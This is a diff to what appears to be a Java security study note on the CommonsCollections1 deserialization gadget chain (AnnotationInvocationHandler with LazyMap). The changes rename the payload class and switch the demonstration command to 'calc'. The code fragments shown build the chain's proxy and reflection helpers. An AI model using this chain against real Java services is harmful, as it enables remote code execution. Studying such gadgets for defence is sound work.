@@ -4,6 +4,8 @@ description: AnnotationInvocationHandler+LazyMap
 
 # CommonsCollections1
 
+PayLoad：
+
 ```java
 import java.io.*;
 import java.lang.reflect.*;
@@ -16,7 +18,7 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 import static sun.reflect.misc.FieldUtil.getField;
-public class CommonsCollectionPayload {
+public class CommonsCollections1 {
     static String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
     //getInvocationHandler用于获取名为handler的InvocationHandler实例，并将map传入成员变量memberValues
     public static InvocationHandler getInvocationHandler(String handler, Map<String, Object> map) throws Exception {
@@ -31,7 +33,7 @@ public class CommonsCollectionPayload {
     public static <T> T createMyproxy(InvocationHandler ih, Class<T> iface) {
         final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, 1);
         allIfaces[0] = iface;
-        return iface.cast(Proxy.newProxyInstance(CommonsCollectionPayload.class.getClassLoader(), allIfaces, ih));
+        return iface.cast(Proxy.newProxyInstance(CommonsCollections1.class.getClassLoader(), allIfaces, ih));
     }
     //setFieldValue用于设置obj对象的成员变量fieldName的值为value
     public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
@@ -49,7 +51,7 @@ public class CommonsCollectionPayload {
         field.set(obj, value);
     }
     public static void main(String[] args) throws Exception {
-        String[] execArgs = new String[]{"open /Applications/Calculator.app/"};
+        String[] execArgs = new String[]{"calc"};
         // inert chain for setup
         Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
